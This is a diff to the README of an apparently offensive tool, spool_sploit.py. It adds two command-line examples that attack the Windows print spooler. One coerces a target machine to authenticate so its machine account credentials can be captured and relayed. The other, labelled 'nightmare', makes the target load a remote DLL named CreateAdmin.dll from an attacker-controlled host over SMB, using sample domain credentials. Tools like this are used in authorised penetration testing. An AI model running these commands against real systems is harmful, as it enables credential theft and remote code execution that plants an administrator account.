@@ -52,6 +52,12 @@ optional arguments:
                         Username for authentication
   -p PASSWD, --password PASSWD
                         Password for authentication
+
+Example - spoolsample:
+  python3 spool_sploit.py -a spoolsample -lH 10.14.1.24 -d evil.corp -u rjmcdow -p 'P4ssword123!' -rP 445 -rH 10.5.1.10
+
+Example - nightmare:
+  python3 spool_sploit.py -a nightmare -lS '\\10.14.1.24\C$\CreateAdmin.dll' -d evil.corp -u rjmcdow -p 'P4ssword123!' -rP 445 -rH 10.5.1.10
 ```
 
 ### SpoolSample - Capture and relay Windows machine account credentials
